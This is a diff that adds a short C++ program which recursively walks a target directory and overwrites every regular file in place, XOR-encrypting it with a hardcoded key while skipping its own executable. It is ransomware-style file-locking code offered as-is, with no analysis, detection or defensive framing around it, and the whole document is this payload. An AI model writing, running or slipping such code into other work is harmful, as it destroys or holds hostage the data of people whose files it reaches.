@@ -1,0 +1,84 @@
+#include <iostream>
+#include <filesystem>
+#include <fstream>
+#include <string>
+#include <vector>
+
+namespace fs = std::filesystem;
+
+// Hardcoded encryption key (XOR-based)
+const unsigned char ENCRYPTION_KEY = 0xAA;
+
+// Function to encrypt/decrypt file content using XOR
+void encryptFile(const std::string& filePath, const std::string& exeName) {
+    // Skip encrypting the executable itself
+    if (filePath.find(exeName) != std::string::npos) {
+        std::cout << "Skipping self: " << filePath << std::endl;
+        return;
+    }
+
+    std::ifstream inFile(filePath, std::ios::binary);
+    if (!inFile) {
+        std::cout << "Unable to open file for reading: " << filePath << std::endl;
+        return;
+    }
+
+    // Read file content into a buffer
+    std::vector<char> buffer((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
+    inFile.close();
+
+    // Encrypt the content using XOR with the key
+    for (char& c : buffer) {
+        c ^= ENCRYPTION_KEY;
+    }
+
+    // Write the encrypted content back to the file
+    std::ofstream outFile(filePath, std::ios::binary | std::ios::trunc);
+    if (!outFile) {
+        std::cout << "Unable to open file for writing: " << filePath << std::endl;
+        return;
+    }
+
+    outFile.write(buffer.data(), buffer.size());
+    outFile.close();
+
+    std::cout << "Encrypted: " << filePath << std::endl;
+}
+
+// Function to traverse directory and encrypt all files
+void encryptDirectory(const std::string& dirPath, const std::string& exeName) {
+    try {
+        for (const auto& entry : fs::recursive_directory_iterator(dirPath)) {
+            if (entry.is_regular_file()) {
+                encryptFile(entry.path().string(), exeName);
+            }
+        }
+    } catch (const std::exception& e) {
+        std::cout << "Error accessing directory or file: " << e.what() << std::endl;
+    }
+}
+
+int main(int argc, char* argv[]) {
+    std::string targetDir;
+
+    // Check if a directory is provided as a command-line argument
+    if (argc > 1) {
+        targetDir = argv[1];
+    } else {
+        std::cout << "No directory provided. Enter target directory path: ";
+        std::getline(std::cin, targetDir);
+    }
+
+    // Get the name of the executable to avoid encrypting itself
+    std::string exeName = fs::path(argv[0]).filename().string();
+
+    if (fs::exists(targetDir) && fs::is_directory(targetDir)) {
+        std::cout << "Starting encryption in directory: " << targetDir << std::endl;
+        encryptDirectory(targetDir, exeName);
+        std::cout << "Encryption complete." << std::endl;
+    } else {
+        std::cout << "Invalid directory path: " << targetDir << std::endl;
+    }
+
+    return 0;
+}
